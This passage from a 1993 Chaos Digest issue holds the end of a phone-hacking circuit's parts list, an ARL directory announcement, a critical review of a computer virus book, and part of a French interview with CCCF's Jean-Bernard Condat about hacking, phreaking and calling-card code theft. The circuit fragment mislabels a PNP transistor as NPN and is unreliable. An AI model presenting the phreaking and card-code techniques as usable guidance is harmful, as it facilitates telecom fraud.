   R4     : 33K  Resistor

   R5     : 220 ohm Resistor

   Q1     : NPN Transitor#> 2N3906

   Q2     : NPN Transitor#> 2N3904

   B1     : 3V external battery supply (2x AA batteries)

   Led1   : General purpose Light emitting diode


   All can be found at Radio Shack...

   For Beginners:

   One particular thing to note: On Q1 and Q2, When I drew them above, it
   was hard. So I labeled each with their corresponding E - C - B...
   What is ECB?? It stands For Emitter, Collector, Base.  I hope I did
   them right, Its been a while, and I wasn't sure, but basically, if you
   get the right transistor number you don't have to worry, just put it
   in the circuit with the E being the little ARROW coming off of the
   picture on the back of the Transistor pack.

   Good Luck...

FYI
+---

I don't know about in France, I have no experience hacking away at French
phones, so I don't know if the same voltages and such would apply.

Also, I got mine from a Electronics Magazine, so if you printed it, you would
have to get permission from the Magazine itself, I do believe that the
interest overwhelmed the digest people at the time and in an effert to help
everone out, I my have put a disclaimer at the start of the article about it
being published WITHOUT their consent.

If you would like information as to the Magazine I got it and such, or would
like me to PhotoCopy you the article, just send me a SELF-ADDRESSED-AND-
STAMPED-ENVELOPE, and I will send it out to you.  Please include the proper
postage to get it from the States to you, in France.

+---------------- + ---------------------------------- + ------------------- +
|Steven Shimatzki-| InterNet : SJS132@PSUVM.PSU.EDU    | I'm Batty for Bats  |
|Rd# 1 Box 20-A   |   -or-   : SJS132@FERT1.FE.PSU.EDU +---------------------+
|Dunbar, Pa 15431 |      Cavers Need Friends Too!      | NSS: 36421          |
+---------------- + -----------------------------------+-------------------- +

------------------------------

Date: Wed May 26 07:56:56 EDT 1993
From: ann@cni.org (Ann Okerson )
Subject: File 5--3e edition du "Dir. of Electronic Publications" (presse)


Responding to the library and academic communities' increasing use of and
interest in the burgeoning number of electronic  publications, the Association
of Research Libraries is publishing the third edition of the hard-copy
Directory of Electronic Journals, Newsletters, and Scholarly Discussion Lists.

With the extraordinary expansion of microcomputers and linked  networks as
vehicles for scholarly exchange, the problem of how and where to find various
academic forums grows continuously.  Although many journals, newsletters, and
scholarly lists may be accessed free of charge through Bitnet, Internet, and
affiliated academic networks, it is not always a simple chore to find what
is available.

The new edition of the Directory is a compilation of entries for 1152
scholarly lists and 240 electronic journals, newsletters, and related titles
such as newsletter-digests -- an increase in size of close to 60% since the
second edition of March 1992 and nearly 2.5 times the size of the first
edition of July 1991.  The  directory provides specific instructions for
electronic access to  each publication. The objective is to assist the user
in finding relevant publications and connecting to them quickly, even if he
or she is not completely versed in the full range of user-access systems.

Author/compiler of the journals and newsletters section is Michael
Strangelove of the University of Ottawa.  Diane Kovacs of the Kent State
University Libraries, continues to lead the KSU team -- nine individuals who
collaboratively created the third edition's scholarly discussion lists and
interest groups section.  The ARL directory is derived from network-accessible
files maintained by Strangelove and Kovacs.  The directory points to these
files as the authoritative sources.

The third edition is produced in 8.5 x 11 paperbound format.  Scholarly lists
are grouped by broad subject areas, and journals and newsletters are in
alphabetical order.  In a new enhancement, a substantial index of keywords,
titles, and institutional affiliations is provided.  As in the previous two
years, front matter of value to electronic serial readers is included.  Again,
a scholarly article on networked scholarly publications leads (James J.
O'Donnell, University of Pennsylvania with aprovocative view of "St. Augustine
to NREN"), followed by bibliographies commissioned from David Robison,
University of California at Berkeley Libraries and an editor of the e-journal
Current Cites, on electronic publishing; and Michael Strangelove on electronic
networking.

Finally, a widely felt need is addressed by inclusion of the standard format
for citation of electronic serials, bulletin boards, and electronic mail.
This was prepared by the National Library of Medicine and is now accepted for
use among many scholars and scientists wishing to make adequate reference of
networked information.

The Association of Research Libraries is a not-for-profit organization
representing 119 research libraries in the United States and Canada.  Its
mission is to identify and influence forces affecting the future of research
libraries in the process of scholarly communication. ARL programs and services
promote equitable access to, and effective use of recorded knowledge in
support of teaching, research, scholarship, and community service.  These
programs include annual statistical publications, federal relations and
information policy, and enhancing access to scholarly information resources
through telecommunications, collection development, preservation, and
bibliographic control.  The Office of Scientific and Academic Publishing works
to identify and influence the forces affecting the production, dissemination,
and use of scholarly and scientific information.


DIRECTORY OF ELECTRONIC JOURNALS, NEWSLETTERS, AND ACADEMIC
DISCUSSION LISTS  (ISSN:  1057-1337), Third Edition, April 1993

To order, contact:
+------------------

Gloria Haws
Publications Manager
Association of Research Libraries
21 Dupont Circle, Suite 800
Washington, DC  20036
Voice: 202-296-2296
Fax: 202-872-0884
E-mail: osap@cni.org


ALL ORDERS MUST BE PREPAID in US DOLLARS. Price per copy:  $42 US
plus postage, shipping, and handling: $ 5.00 USA, $ 8.00 CANADA, $12.00
EUROPE (air mail), $15.00 OTHERS (air mail).


Note Bene
+---------

1. Some copies of the 1992 edition are available for sale at a reduced price.

2. A diskette version will be available. Contact us for price and details.

3. Special prices for orders of 5 copies or more and Special prices for the
   119 libraries which are members of the Association of Research Libraries
   are available.  Please contact us for these.

------------------------------

Date: Fri Jul  9 13:07:00 -0600 1993
From: roberts@decus.arc.ab.ca ("Rob Slade, DECrypt Editor, VARUG NLC rep )
Subject: File 6--Critique de "Computer Virus Crisis", Fites/Johnston/Kratz
Copyright: Robert M. Slade, 1993


Van Nostrand Reinhold
c/o Nelson Canada
1120 Birchmont Road
Scarborough, Ontario
M1K 5G4
416-752-9100
fax: 416-752-9646
The Computer Virus Crisis, 2nd edition, 1992; Fites, Johnston, Kratz
ISBN  0-442-00649-7

For its professional appearance and impressive credentials, this work is an
unfortunately sloppy and undisciplined approach to the problem.  The looseness
of the book starts with the definition of a virus: it really doesn't have one.
There is a section of the introduction entitled "What is a computer virus",
but, having stated that they prefer the Cohen or Adelman definitions (without
quoting them), quoting the Podell/Abrams definition, and meandering around
the related terms such as worms and trojans, no definition is ever finalized.

The book tends to read in a schizoid fashion.  It often contradicts itself,
again starting the with definition, where a "buggy" program which submitted
jobs to the queue too frequently is first used as an example of a virus, and
then is said to contradict the definition of a virus.  Page ten gets points
for stating that downloaded software is probably safe; page sixty loses them
all again by stating that "bulletin boards present the greatest exposure to
computer viruses"; and the very next sentence on page sixty states that
bulletin boards are less risky than other means of obtaining software.  Page
62 mentions the rumour that a virus was spread via email, dismisses CHRISTMA
and the Internet Worm as non-viral, and then pooh-poohs the concept.

A mainframe, and corporate, bias is quite evident in the work.  Mainframe
professionals are said to know what viral programs are, and to be "ethical".
(The more corporate of the computer and data processing associations are also
given credit for the lack of mainframe viri.)  However, this bias seems to
preclude an accurate knowledge of personal and microcomputers.  DOS (obviously
referring to MS-DOS) is said to have "completely overwhelmed CP/M is the late
1970's" in spite of the fact that the PC wasn't marketed until 1981.  Apple
Corporation is credited with the invention of the "GUI" (and the Mac Toolbox
is credited with the success of Mac viri, in spite of the fact that the
Toolbox is primarily concerned with the user interface).

A number of myths are presented as fact.  The recommended procedure for virus
cleanup is a low-level format of the disk.  "Physical damage" is listed as one
fo the symptoms of a virus.  A very odd list of non-viral computer attacks
contains the "salami scam" (siphon off fractions of a penny) urban legend.

As with the Feudo book, almost half of the pages in this work are a reprint of
the Hoffman Summary List (in this case "dated" January, 1991, but "copyright"
1990).  Graphics are used to take up additional space: a number of the figures
are used several times over, without ever really adding anything to the
understanding of the subject under discussion at the time.

It is very hard to find anything to recommend in this book. At best, the naive
reader will be confused by the meandering nature of the text and the self-
contradictions contained in it. For every positive statement (such as the fact
that computer retail and repair shops are a source fo infections), there is
nonsense such as the statement that when you discover the identity of the
author of malicious software, you have a legal basis for action.  (As a
counter example, the AIDS trojan is thoroughly covered in this book, and we
have recently learned that Popp's  case was dismissed in Britain, although he
was found guilty, in absentia, in Italy.)

+++++++++++++++                     ______________________
Vancouver      ROBERTS@decus.ca    |    |     /\     |    | swiped
Institute for  Robert_Slade@sfu.ca |    | __ |  | __ |    | from
Research into  rslade@cue.bc.ca    |    | \ \    / / |    | Mike
User           p1@CyberStore.ca    |    | /________\ |    | Church
Security       Canada V7K 2G6      |____|_____][_____|____| @sfu.ca

------------------------------

End of Chaos Digest #1.72
************************************

Chaos Digest               Jeudi 5 Aout 1993        Volume 1 : Numero 73
                            ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.73 (5 Aout 1993)
File 1--"Faut-il crucifier Condat?" par Jack Tajtelbom (sensationnel)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: 27 May 93 03:59:59 GMT
From: cccf@altern.com (Jean-Bernard Condat )
Subject: File 1--"Faut-il crucifier Condat?" par Jack Tajtelbom (sensationnel)
Reprint from: 'Reponse Micro', no. 11, Aout-Sept. 93, pp. 122-26

   [Cover Page:  La folle histoire du CCCF et de son fondateur]

               Confessions d'un hacker sous surveillance

                       FAUT-IL CRUCIFIER CONDAT?
                               Interview

+----------------------------------------------------------------------------+
| Vingt-sept ans, consultant dans une grande societe de services specialisee |
| Jean-Bernard Condat, popularise par de nombreux passages tele, est         |
| surtout connu comme secretaire general du Chaos Computer Club de           |
| France; un groupe quasiment occulte, compose de genies informatiques       |
| capables de percer les meilleurs systemes.  Mais dans quel but?  Pirater   |
| ou moraliser?  C'est ce que nous avons essaye de savoir.                   |
+----------------------------------------------------------------------------+

  En 1991, Jean-Bernard Condat a les honneurs de la grande presse.  On l'
empeche de faire une demonstration dans l'emission _Mardi Soir_, sur A2, ou
il avait promis de penetrer des fichiers bancaires.  Deux jours plus tard,
dans les locaux de _France Soir_, il rentre dans les systemes informatiques
de la CEE et de la NASA.  Parallelement, il est accuse par France Telecom
d'avoir pirate ses banques de donnees internationales, avec l'aide d'un
technicien qui lui aurait fourni les codes.  France Telecom lui reclame
250000 francs.  Deux ans apres, l'affaire n'est toujours pas jugee.  Mais
Condat, sous controle judiciaire et sous astreinte financiere, etroitement
surveille, et psychologiquement epuise, refuse toujours de se taire.

RM: Commencons par votre parcours.  Comment etes-vous rentre dans ces reseaux
  d'information, comment vous etes-vous interesse a l'informatique, et puis
  a la formation?

JBC: J'ai eu mon bac a seize ans et demi. A cette epoque, je ne faisais pas
  d'informatique. Je suis monte a Lyon pour faire de l'acoustique, avec un
  seul "c". Mon prof de physique musicale ecrivait "accoustique", avec deux
  "c"... Cette erreur m'a fait prendre conscience que pour faire de la
  musicologie - musique-au-logis, comme marechal-des-logis - en fait il
  suffisait de gratouiller une guitare. Je me suis dit: "Stop, on va etre
  plus serieux." Et cela m'a amene a faire Math sup et Math spe et a
  m'interesser Ptout en poursuivant mon doctoratP a quelque chose de plus
  rigoureux: l'etude des outils permettant de transmettre l'information.
  A l'IUT de Lyon, j'ai decouvert le Cobol, les machines (Commodore 64), etc
  J'etais un eleve turbulent, foncierement penible, totalement asocial. A
  l'epoque, j'avais envie de savoir pourquoi l'outil informatique ne servait
  a rien. C'est comme un stylo Mont-Blanc, pas fait pour autre chose que de
  se trouver pose a l'horizontale sur la table. L'outil, il faut savoir s'en
  servir, l'appliquer a quelque chose. L'informatique doit s'appliquer.
  Bizarrement, en France, l'informatique ne s'appliquait qu'a la gestion.
  On passait des BTS d'informatique de gestion. A l'epoque, on n'avait pas
  de minitel. Et apparaissaient a ce moment des maladies ou des instruments
  bizarres, comme les lunettes pour informaticiens. Je me suis rendu compte
  que l'informatique pouvait bouffer les organes. Elle peut vous manger les
  yeux a force de regarder l'ecran. Je me suis dit: "Pourquoi ne pas etudier
  tous ces elements-la?" Et alors est arrive un incident que personne
  pratiquement n'a rapporte: un jour, le fils d'un banquier suisse de Geneve,
  autiste, me voit passer a la tele... Il trouve ca genial, dit deux ou trois
  mots devant ses parents. Il avait a peu pres treize ans, et le pere, qui
  ne l'avait jamais entendu parler, me fait rechercher. Il me retrouve.
  Depuis ce moment, j'ai vu que les jeux video pouvaient soigner les
  deficiences parlees ou emotives. J'ai pense: "C'est bizarre, l'informatique
  peut detruire tes yeux, tout comme les notes de musique (je suis organiste),
  mais aussi reparer, comme ce gosse." Au bout d'une annee, en jouant avec
  lui toutes les 2/3 semaines pendant un week-end entier, on etait arrive
  a lui rendre une dignite, la dignite de la parole. C'est a ce moment, avec
  quatre copains, en psycho, en psychiatrie - aucun en informatique - que
  nous avons cree un groupe. On ne trouvait pas de nom. On a reflechi, et
  on est tombe sur une publication du Chaos Computer Club de Hambourg. Et
  on a trouve que "CCC France," ca convenait pour reveiller plusieurs
  notions: attention, l'informatique c'est dangereux; ca peut casser; ca
  peut reparer... C'est un outil qui peut etre aussi bien tres bon que tres
  mauvais. Pour creer ce groupe, on a commence a quatre, de la faculte
  catholique de Lyon. Et on a eu les pires incidents de la planete parce
  qu'on s'interessait a un milieu frequente par plusieurs types: les gentils
  et les mechants. Qui sont les gentils? Tous ceux qui traquent les mechants.
  Et les mechants, ce sont tous ceux qui soi-disant volent, "hackent,
  swappent, freakent". Le swapping, c'est le piratage des logiciels. Le
  hacking, c'est s'introduire dans les gros systemes, les banques de donnees.
  Et le freaking, c'est comment arriver, depuis n'importe quelle cabine
  telephonique, et sans carte, a telephoner partout dans le monde. Si on
  etudie cela, ce n'est pas pour faire mieux qu'eux, les recenser, ou apporter
  aux services secrets de quoi les aider a travailler. Nous, on essaie 1) de
  former 2) d'informer 3) de prevenir. On le fait en disant aux grands
  utilisateurs quelles sont les faiblesses de leurs systemes, de leur
  approche, de leur methodologie, etc. Quand je vois, par exemple, un
  organisme qui verse de l'argent a des personnes necessiteuses, la Caisse
  d'Allocations Familiales de Vesoul qui a paye deux fois le RMI a 22000
  personnes au mois de mai... Comment imaginer la recuperation du deuxieme
  versement?

RM: Sur les versements ulterieurs...

JBC: Sur 22000 personnes necessiteuses! En voyant cela, elles se sont dit:
  "Merci, Seigneur!" Comment vous allez leur arracher? Il va y avoir des
  cris et des grincements de dents. Nous, ce qu'on souhaiterait pour eviter
  ce genre de situation c'est, non pas stopper, on ne peut pas stopper une
  erreur humaine ou informatique, mais prevenir, porter une reflexion. Autre
  exemple, les ambulances de Londres. Ils ont change leur systeme a fiches,
  entierement manuel, par un nouveau, informatise. Seul probleme, cela s'est
  fait avec tellement de douleur qu'il y a eu quarante-sept morts! 47
  personnes qu'on n'a pas pu sauver parce que le systeme etait mal regule
  par rapport a l'ancienne methode.

  Nous, nous aimerions trouver ce petit aspect humain, adapte a la France, et
  securiser les fameux systemes d'informations. Y compris pour l'acces: la
  CNIL n'est qu'une soupape de securite. Nous aimerions apporter notre
  opinion. Cela ne peut etre que tres mal vu par tous les facteurs et les
  elements que constitue la chaine de securisation, en partant du
  constructeur, l'utilisateur, le pirate, etc., mal vu par beaucoup de monde
  parce qu'on leur mange des reflexions. On detourne leur flot de profits.
  Vous imaginez que si on dit: "Aie, votre systeme..." Une centaine de
  personnes ne travaillent plus pendant trois mois. Donc, on nous reproche
  de casser du sucre, de brader le marche, de dire ce qu'il ne faut pas dire.
  Alors, depuis tres peu de temps, on ne dit rien. On est tellement bride
  qu'on ne dit absolument plus rien. Donc reponse, pas micro, mais reponse
  mini.

RM: Parlez-moi encore de la genese de ce groupe. Il n'est malgre tout pas
  innocent de s'appeler Chaos Computer Club...

JBC: On s'appelle Chaos Computer Club France.

RM: Bien sur, mais c'est une subtilite semantique qui ne fait pas oublier
  que le CCC, c'est aussi Hambourg.

JBC: CCC, c'est Hambourg. CCCF, c'est nous. Ca, c'est clair. Ce sont deux
  structures totalement separees. Mais semantiquement, on a bien recherche
  a ce que l'une evoque l'autre.

RM: Pour proteger les systemes, il faut bien les connaitre. C'est a double
  tranchant. Il faut pouvoir rentrer dedans - ce qu'on vous a reproche
  plusieurs fois - et apprendre a les proteger pour que d'autres n'y rentrent
  plus.

JBC: Comment font les constructeurs et les consultants en securite
  informatique? On ne fait pas autrement qu'eux, mais nous, on n'a pas leurs
  moyens... on n'intervient pas sur la vie des gens, on n'utilise pas
  abusivement la liste rouge. On ne pietine pas la vie de certaines personnes
  privees. On ne les assigne pas dans des histoires foireuses en les
  inculpant pendant deux ans. Pourquoi, alors, fait-on taire les personnes?

RM: Est-ce que, justement, ce n'est pas parce que vous etes independants?
  Vous ne dependez pas des Telecom.

JBC: On est 72, on recoit 1800 lettres par semaine, mais on est independants.
  Nous ne sommes pas une association mais un groupe de fait.

RM: Est-ce que ce n'est pas cela qui les gene? On ne peut pas vous controler.

JBC: Pourquoi? Mais le Clusif (Club de la securite informatique francaise)
  a ete tres longtemps une association de fait. Puis ils se sont mis a faire
  une association type loi 1901. Mais ils ont vecu, je pense, le meilleur de
  leur vie en etant un groupe comme nous. Donc, votre argumentation, on peut
  l'appliquer aussi au Clusif, le plus grand club.

RM: Qui en faisait partie?

JBC: Les responsables de la securite de toutes les plus grandes entreprises
  francaises, celles qui ont du fric et qui payent.

RM: Donc des gens...

JBC: Au-dessous de tout soupcon! Nous, on est aux ordres de notre conscience:
  ne pas casser, ne generer que du bien. C'est notre but. On n'est pas la
  pour embeter quiconque. Ils ne l'ont pas compris. On est la pour faire
  avancer le schmilblic, diffuser une information que personne n'arrive a
  obtenir. On fait connaitre des produits de securite francais, des
  services... Par exemple, on dit que le marquage des ordinateurs est
  inutile. Certaines societes s'amusent a marquer, avec une plaquette
  "anti-arrachable", les ordinateurs. Mais si je marque un parc de cent
  micros, cela va me couter une fortune. Si un voleur me prend ma machine,
  qu'est-ce que vous voulez qu'il en fasse de ce marquage? Il le vole avec.
  Donc, je dis clairement que le marquage des moyens informatiques ne sert
  a rien. Nous denoncons cet abus total. A une certaine epoque, pour utiliser
  les cartes Pastel, il fallait dicter le numero de la carte, qui
  correspondait au numero de telephone, et le code secret, suivi du numero
  du correspondant. Vous imaginez bien qu'il y a eu des milliers de petits
  freakers qui s'amusaient, dans le hall des grands hotels du monde entier,
  a ecouter: "Bonjour, c'est une communication par carte Pastel
  internationale, voici mon numero, mon code secret, le numero que je veux
  appeler..." Imaginez-vous qu'en six minutes de demonstration, avec une
  grande chaine de tele (FR3), j'en ai recolte six ou sept, dans le hall de
  l'hotel Hilton a Paris. En ne faisant rien. C'est ce qu'on veut prevenir.
  Une chose tres amusante, par exemple: dans le Numeris, le telex n'est pas
  integre. Autre exemple: il existe des Actel, agences France Telecom, dans
  lesquelles les mots de passe des serveurs de demonstration se trouvent
  graves sur les minitels qui servent aux demonstrations.  Transpac offre
  un service, Atlas 400, non connectable a Internet. Donc, les 4739 users
  d'Atlas 400 sont des grands comptes qui s'echangent entre eux a grands
  frais des messages, on se demande pourquoi... Si ce n'est pour remplir
  les caisses de Transpac, mais certes pas dans un but d'efficacite. En plus,
  les enveloppes electroniques d'Atlas sont tres mal faites, du moins
  tellement complexes qu'on s'amuse... Et la convivialite du service est a se
  tordre de rire. Exemple, pour lire les messages, c'est pas Read, ou R, ou
  Envoi; c'est LIRMES. Comment vider sa Boite aux lettres? C'est pas Delete
  all, ou "supprime les tous"; c'est VIDBAL... C'est clair... Et comment se
  deconnecter du serveur? Par une coupure a chaud! Clac! Parce que la
  commande Quit, ou End, n'existe pas. C'est pas serieux. Heureusement, les
  petits serveurs comme Altern en 3616, ou Email en 3617 remedient avec
  beaucoup d'elegance a cette lacune. Et quand on demande a Transpac pourquoi
  Atlas 400 n'est pas accessible, ils repondent que c'est parce qu'ils ne
  savent pas refacturer le service a leurs utilisateurs.

  Au CCCF nous ne sommes que 72, on ne peut pas etre plus dans notre groupe...
  On les prend a la sortie de Polytechnique, generalement ils sont membres
  de la Mensa, sains de corps et d'esprit, ayant de quoi vivre largement
  au-dessus de leurs moyens, et moi je suis la carotte. Moi, je suis
  secretaire general, je suis la pour parler et emettre, mais je suis le
  plus con de tous. En informatique, je ne sais rien. Je ne suis pas la
  cheville ouvriere, mais la reine (ou le roi) visible de l'essaim.

RM: Cet aspect mediatique, deja, c'est une garantie...

JBC: Vous avez compris la finalite. Quand on a annonce, une fois, qu'un virus
  nomme Daniela, avec un petit moteur d'inference, une base de donnees, une
  base de connaissances, allait sortir, Remi Bellon, de l'AFP, a fait une
  depeche de 350 mots pour l'expliquer. Ca a tellement tripatouille les gens
  que le virus, on ne l'a jamais vu, sauf dans les archives des
  "virusologues".

RM: Le virus n'existait pas?

JBC: Si. Mais on est arrive a trouver la parade qui bloquait son vecteur de
  propagation. Et on n'a pu le faire que grace a cette depeche, qui a genere
  une centaine d'articles. Alors, quand on m'interdit de me presenter sur
  les lieux des JO d'Albertville, parce que je risque de troubler la securite
  de ce site a ce moment-la, cela fait sourire. Parce que je ne vois pas en
  quoi ma petite personne aurait pu troubler l'immense realisation des JO.
  Qu'aurais-je pu faire, alors que je ne suis qu'un pauvre petit degenere
  qui ne fait qu'appater le petit hacker, le Rambo du minitel, alors que moi
  je ne programme pas, je ne fais pratiquement rien. C'est pas moi qui me
  coltine chaque jour la redaction d'un bulletin de 51000 octets, qui est
  diffuse a 1400 responsables de la securite informatique, parmi lesquels
  la NASA, Interpol, tout le monde. Alors, soyons raisonnable...

RM: Est-ce que le systeme est raisonnable?

JBC: Le systeme doit, de temps en temps, ne pas etre raisonnable. Et sans
  ecraser des libertes, soit individuelles, soit collectives. Notre but,
  c'est aussi de montrer que la France sait se realiser dans ces points-la.
  Et nous devons aussi avoir un phare, qui s'appelle le CCCF, ou autre, qui
  doit etre, pour la Communaute internationale, la reference du piratage en
  France. Pourquoi? Il y en a dans tous les pays, mais il n'y en avait pas
  en France. Nous l'avons cree pour focaliser l'attention. Nous n'avons pas
  de CERT (Computer Emergency Recognizement Team - Centre de signalisation
  des evenements informatiques) pour signaler les ambulances de Londres ou
  la CAF de Vesoul, non cites dans la presse, si ce n'est dans Chaos Digest,
  mais nous voulons que les specialistes puissent etudier et avoir plus de
  billes pour repondre aux questions qui se presentent a eux. Nous ne sommes
  ni un organisme de piratage, ni d'anti-piratage. On etudie sur le plan
  sociologique, psychologique. Voila ce qui vous pose un probleme de
  positionnement. On est une equipe de chercheurs qui est donc dans la
  realisation. On a 400 demandes par semaine. On diffuse notre revue
  gratuitement, 1400 personnes la lisent, et ces personnes... A vous laisser
  pantois. On a 204 nouvelles demandes chaque semaine. Les Americains savent
  que la France est un vecteur d'originalite, de liberte. C'est a nous de
  l'imposer. Nous sommes repartis partout dans le monde. Les membres ne se
  reunissent jamais, sauf electroniquement. Donc, il n'y a pas de liste
  d'adresses des membres. Je connais globalement certains noms ou pseudos,
  mais je ne les ai jamais rencontres.

RM: Ne pas connaitre physiquement les gens, cela peut avoir quelques
  inconvenients. Le technicien de France Telecom accuse d'avoir casse des
  codes... Si vous ne les connaissez pas, vous ne pouvez pas savoir qui ils
  sont et de quoi ils sont capables. S'ils sont la pour vous aider, ou pour
  obtenir des infos qui leur permettent de casser...

JBC: Une depeche est sortie, c'est vrai: un technicien de France Telecom,
  grace au Chaos... Mais, ne pas connaitre... On connait toutes les activites
  d'un membre, jusqu'a savoir les operations qu'il a effectuees sur son CCP
  depuis dix ans. On connait la personne et chaque mouvement de son petit
  doigt. Mais on n'est pas force de l'avoir rencontree.

RM: Oui, mais s'il craque a un moment et qu'il fait quelque chose qu'il n'a
  jamais fait, vous ne pouvez pas le savoir.

JBC: Non... On a des grilles d'evaluation. Tenez, le FBI est tres tres
  soigneux la-dessus. On est co-editeur de FBI Presents, la grande revue
  electronique du FBI. Vous savez, les E-journals font partie d'un groupe,
  et sont publies dans un repertoire dit des 384. Ils ont des grilles
  d'evaluation de la degenerescence et des besoins des informaticiens. Dans
  le panel francais, il y a plusieurs organismes: le Clusif (Club de la
  securite informatique francaise) qui regroupe l'ensemble des societes;
  le Cigref qui s'occupe, entre autres, de securite informatique; il y a le
  CCCF, l'APP. Tous ne s'occupent pas que de securite: l'APP s'occupe de
  swapping. Ce n'est pas notre role. Le Clusif s'occupe... On ne sait pas
  de quoi. Quand je lis leurs textes, parfois, ca me fait rire. Manque de
  competences. Il n'existe pas un seul membre du Clusif qui soit susceptible
  d'etre membre du CCCF. L'interet du Clusif est de se developper et d'avoir
  des membres qui payent. Chez nous, les membres ne payent pas: on est la
  pour creer une dynamique. On m'a demande une fois si ce n'etait pas une
  confrerie. Je dirai carrement que c'est une loge.

RM: Ca y ressemble. C'est un critere comme un autre, mais quel rapport entre
  un bon informaticien et un membre de la Mensa?

JBC: Aucun.

RM: Sauf peut-etre l'idee qu'on se fait d'un groupe elitiste, mais d'un
  elitisme de la competence.

JBC: La competence est indispensable. Le media electronique est excessivement
  difficile a dompter. Il existe de grandes banques de donnees, des Host, qui
  possedent des fichiers qui repertorient l'ensemble des fichiers cruciaux,
  comme l'INPI (Institut national de la propriete industrielle), ou Francis,
  l'immense base de donnees du CNRS. Les Host ont des mode d'interrogation
  a chaque fois differents. En France, vous avez Questel, aux USA Dialog,
  il y en a des milliers, interrogeables en divers langages qu'il faut
  systematiquement etudier, et sous lesquels les ordinateurs travaillent.
  Il n'y a pas de langage unifie. On forme a ces langages. Pour les
  interroger, on fait le 3621, en 80 colonnes, on appelle le PAD, et on
  demande l'aiguillage vers n'importe quelle adresse informatique, les NUA
  (Network User Address). Cela necessite une autorisation, un NUI (Network
  User Identifier). Et France Telecom me reproche d'avoir utilise pendant
  une periode qui, si on divise la somme qu'on me reclame par le cout des
  communications, correspond a 15,8 annees d'interrogations non-stop! Donc
  on m'inculpe pour avoir utilise un NUI pendant 15,8 annees. Seul probleme,
  ils n'ont pas de preuve, et pour cause: je ne l'ai pas utilise! En fait
  c'est un immense guet-apens, surement tendu pour me faire taire. Ils y
  sont arrives. Le probleme, c'est que cela s'appelle perdre la confiance
  que vous aviez.

RM: Pourquoi vouloir vous faire taire? Vous m'avez dit tout a l'heure que
  vous travailliez avec le FBI. Est-ce que cela ne ferait pas de l'ombre
  aux services secrets francais? Ils ont du essayer de vous approcher...

JBC: Tous les services du monde ont essaye de nous approcher, sauf les
  services francais. Ils ne vous approchent pas. Ils vous pietinent, et
  apres ils vous demandent l'autorisation.

RM: Cela parait absurde.

JBC: Peut-etre. Mais peut-etre n'ont-ils pas les moyens. Les autres nous
  ont approches, qui venaient parfois de pays que je ne connaissais meme pas!
  La reponse a toujours ete non. Nous sommes la pour garantir l'integrite
  de l'information francaise. De toute facon, nous ne travaillons pas dans
  le "renseignement", qui est une information deformee, mal digeree. Nous,
  nous faisons de l'information.

RM: Je ne pensais pas a cela. Par exemple, le CCC de Hambourg est rentre
  dans les ordinateurs de la Nasa. Il n'est pas interdit de penser que, par
  exemple l'Agence Spatiale Europeenne pourrait, malgre son savoir-faire,
  etre interessee par certaines informations...

JBC: La procedure francaise ne le peut pas, dans le cas ou vous l'appliquez.
  Premierement, elle ne pourra jamais mettre en relation le pirate et
  l'officier de securite de l'organisme que vous avez cite, parce que l'on
  ne doit pas connaitre l'autre. "Ne doit pas" et non "ne peut pas": c'est
  un choix fait en France.

RM: J'en reviens toujours a cette idee: pourquoi vouloir vous faire taire?

JBC: Peut-etre aussi parce qu'on travaille benevolement, sans notion d'argent.
  Prenons le cas des virus. Je dis que la securite n'existe que si
  l'insecurite est creee. Si vous vous amusez a ne mettre dans l'ordinateur
  que des lettres tapees par une secretaire, pourquoi iriez-vous acheter un
  antivirus a 1600 ou 1700 francs? Ca ne sert purement a rien.

RM: Oui, mais s'il y a toute la comptabilite de l'entreprise dedans, sans
  sauvegarde?

JBC: Oui. Mais vous avez dit: sans sauvegarde. Ce qui vous aurait coute deux
  ou trois disquettes. Est-ce que vous comparez deux ou trois disquettes, ou
  une bonne information, au prix d'un logiciel antivirus, que deja vous
  n'arriverez pas a mettre en place? Et que dire des logiciels qui bloquent
  l'acces au micro... C'est tellement chiant que parfois on nous appelle pour
  nous dire: "J'ai bloque mon micro, j'y ai des tas de donnees hypersensibles,
  je ne peux pas rentrer dedans." Est-ce que c'est ca, cette notion de
  securite? Elle est mal placee. J'ai ecrit un livre qui va sortir et qui
  s'appelle "C'est decide, j'ecris un virus". Il devait sortir en septembre
  1992 mais, apres maints rebondissements cocasses, il sort en septembre 1993.
  Si l'editeur ne trouve pas encore un pretexte pour ne pas le sortir.

RM: C'est un sujet qui suscite des resistances. Quand on veut questionner un
  grand fabricant, un editeur ou un distributeur de logiciels, ils vous
  jettent.

JBC: C'est normal. Mais on a tout de meme publie une bonne centaine de codes
  source dans Chaos Digest, qui permettent aux chercheurs de les connaitre,
  de les etudier. Et surtout les derniers sortis. On publie celui qui est
  sorti il y a deux jours, et l'article est generalement signe de l'auteur
